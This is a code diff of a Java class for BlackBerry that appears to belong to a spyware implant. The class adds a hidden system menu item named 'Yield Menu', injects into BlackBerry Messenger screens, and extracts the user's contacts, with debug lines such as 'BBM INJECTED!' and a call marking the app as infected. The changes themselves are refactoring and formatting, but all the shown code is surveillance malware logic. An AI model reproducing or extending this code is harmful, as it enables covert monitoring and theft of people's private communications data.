@@ -25,7 +25,7 @@ import blackberry.injection.MenuWalker;
 import blackberry.utils.Utils;
 
 public class BBMMenuItem extends ApplicationMenuItem {
-    private static String bbmMenu = "Yield";
+    private static String BBM_MENU = "Yield Menu";
     //#ifdef DEBUG
     private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
     //#endif
@@ -117,10 +117,10 @@ public class BBMMenuItem extends ApplicationMenuItem {
 
     private void checkScreen(int tries) {
         Screen screen = UiApplication.getUiApplication().getActiveScreen();
-        if(tries<=0){
-//#ifdef DEBUG
-debug.trace("checkScreen: no more tries");
-//#endif
+        if (tries <= 0) {
+            //#ifdef DEBUG
+            debug.trace("checkScreen: no more tries");
+            //#endif
             return;
         }
 
@@ -143,7 +143,7 @@ debug.trace("checkScreen: no more tries");
             FieldExplorer explorer = new FieldExplorer();
             contacts = explorer.explore(screen);
             //#endif
-            
+
             screen.close();
             bbmInjected = true;
 
@@ -154,7 +154,7 @@ debug.trace("checkScreen: no more tries");
             debug.info("BBM INJECTED!");
             debug.ledFlash(Debug.COLOR_GREEN);
             //#endif
-            
+
             AppInjectorBBM.getInstance().setInfected(true);
 
         } else if (screen.getClass().getName().indexOf("ConversationScreen") > 0) {
@@ -162,8 +162,8 @@ debug.trace("checkScreen: no more tries");
             debug.info("checkScreen: Conversation, closing");
             //#endif
             screen.close();
-            checkScreen(tries-1);
-        }else{
+            checkScreen(tries - 1);
+        } else {
             //#ifdef DEBUG
             debug.warn("BBM NOT INJECTED!");
             debug.ledFlash(Debug.COLOR_RED);
@@ -252,29 +252,34 @@ debug.trace("checkScreen: no more tries");
     }
 
     public String toString() {
-        return bbmMenu;
+        return BBM_MENU;
     }
 
-    public synchronized void addMenuBBM(String menuName) {
-        //#ifdef DEBUG
-        debug.trace("addMenuBBM");
-        //#endif
+    boolean menuAdded = false;
 
-        bbmMenu = menuName;
+    public synchronized void addMenuBBM() {
+        if (!menuAdded) {
+            //#ifdef DEBUG
+            debug.trace("addMenuBBM: " + toString());
+            //#endif
 
-        long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
-        // long bbmid = 4470559380030396000L; Non funziona
-        // long bbmid = 5028374280894129973L; Non funziona
-        // long bbmid = 7084794250801777300L;
-        ApplicationMenuItemRepository.getInstance().addMenuItem(bbmid, this);
+            long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
+            ApplicationMenuItemRepository.getInstance()
+                    .addMenuItem(bbmid, this);
+            menuAdded = true;
+        }
     }
 
     public synchronized void removeMenuBBM() {
-        //#ifdef DEBUG
-        debug.trace("removeMenuBBM");
-        //#endif
-        long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
-        ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid, this);
+        if (menuAdded) {
+            //#ifdef DEBUG
+            debug.trace("removeMenuBBM");
+            //#endif
+            long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
+            ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid,
+                    this);
+            menuAdded = false;
+        }
     }
 
 }
